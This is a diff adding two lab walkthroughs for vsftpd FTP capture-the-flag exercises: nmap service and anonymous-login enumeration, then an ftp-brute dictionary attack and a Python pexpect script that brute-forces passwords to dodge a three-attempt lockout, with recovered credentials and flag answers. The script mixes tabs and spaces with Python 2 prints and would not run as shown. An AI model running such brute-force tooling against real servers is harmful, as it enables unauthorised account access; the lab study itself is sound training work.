@@ -128,7 +128,6 @@ root@attackdefense:~# cat secret.txt
 
 <details>
 <summary>Reveal Flag - sysadmin flag is: 🚩</summary>
-
 `260ca9dd8a4577fc00b7bd5810298076`
 
 </details>
@@ -174,4 +173,197 @@ root@attackdefense:~# cat secret.txt
 `12a032ce9179c32a6c7ab397b9d871fa`
 
 </details>
+
+## Lab 2
+
+>  🔬 [VSFTPD Recon: Basics](https://attackdefense.pentesteracademy.com/challengedetails?cid=519)
+>
+>  - Target IP: `192.119.169.3`
+>  - Enumeration of [vsftpd](https://security.appspot.com/vsftpd.html) server
+
+```bash
+ip -br -c a
+```
+
+```bash
+eth1@if170803   UP  192.119.169.2/24
+```
+
+- Target IP is `192.119.169.3`
+
+```bash
+nmap 192.119.169.3
+```
+
+```bash
+21/tcp open  ftp
+```
+
+```bash
+nmap -p21 -sV -O 192.119.169.3
+```
+
+```bash
+21/tcp open  ftp     vsftpd 3.0.3
+```
+
+![](.gitbook/assets/image-20230215130759212.png)
+
+> 📌 FTP server version `vsftpd 3.0.3`.
+
+- Use [nmap ftp-anon script](https://nmap.org/nsedoc/scripts/ftp-anon.html) to check `anonymous` user login
+
+```bash
+nmap --script ftp-anon -p21 192.119.169.3
+```
+
+```bash
+21/tcp open  ftp
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| -rw-r--r--    1 ftp      ftp            33 Dec 18  2018 flag
+|_drwxr-xr-x    2 ftp      ftp          4096 Dec 18  2018 pub
+```
+
+> 📌 Anonymous FTP login allowed
+
+```bash
+ftp 192.119.169.3
+# Use anonymous:anonymous to login
+```
+
+```bash
+Name (192.119.169.3:root): anonymous
+    331 Please specify the password.
+Password:
+    230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+
+ftp> ls
+ftp> get flag
+ftp> exit
+
+root@attackdefense:~# cat flag 
+```
+
+<details>
+<summary>Reveal Flag: 🚩</summary>
+
+`4267bdfbff77d7c2635e4572519a8b9c`
+
+</details>
+
+------
+
+## Lab 3
+
+>  🔬 [VSFTPD Recon: Dictionary Attack](https://attackdefense.pentesteracademy.com/challengedetails?cid=520)
+>
+>  - Target IP: `192.14.30.3`
+>  - Dicotionary attack on `vsftpd` server
+>  - *FTP server terminates the session after 3 attemps*
+
+```bash
+ip -br -c a
+```
+
+```bash
+eth1@if170888   UP   192.14.30.2/24 
+```
+
+- Target IP is `192.14.30.3`
+
+```bash
+nmap 192.14.30.3
+```
+
+```bash
+21/tcp open  ftp
+```
+
+```bash
+nmap -p21 -sV -O 192.14.30.3
+```
+
+```bash
+21/tcp open  ftp     vsftpd 3.0.3
+```
+
+```bash
+nmap --script ftp-brute --script-args userdb=/root/users -p21 192.14.30.3
+```
+
+```bash
+21/tcp open  ftp
+| ftp-brute: 
+|   Accounts: 
+|     billy:carlos - Valid credentials
+|_  Statistics: Performed 78 guesses in 55 seconds, average tps: 1.5
+```
+
+> 📌 *billy*'s password is `carlos`
+
+- A custom script to attemp the logins is required if automated dictionary attack do not work, since the server terminates the sessions after 3 login attempts.
+- `e.g.` python script:
+
+```bash
+nano billy.py
+```
+
+```python
+import pexpect
+import sys
+username=sys.argv[2]
+password_dict=sys.argv[3]
+
+# Loading the password dictionary and Striping \n
+lines = [line.rstrip('\n') for line in open(password_dict)]
+
+itr = 0
+# Iterating over dictionary
+for password in lines:
+	child = pexpect.spawn ('ftp '+sys.argv[1])
+	child.expect ('Name .*: ')
+	child.sendline (username)
+    print "Trying with password: ",password
+	child.expect ('Password:')
+	child.sendline (password)
+	i = child.expect (['Login successful', 'Login failed'])
+	if i==1:
+		#print('Login failed')
+		child.kill(0)
+	elif i==0:
+		print "Login Successful for ",password
+		print child.before
+		break
+```
+
+```bash
+python billy.py 192.14.30.3 billy /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+```
+
+```bash
+Login Successful for  carlos
+```
+
+- Fetch the flag
+
+```bash
+ftp 192.14.30.3
+
+ftp> ls
+ftp> get flag
+ftp> exit
+
+root@attackdefense:~# cat flag
+```
+
+<details>
+<summary>Reveal Flag: 🚩</summary>
+
+`c07c7a9be16f43bb473ed7b604295c0b`
+
+</details>
+
+------
 
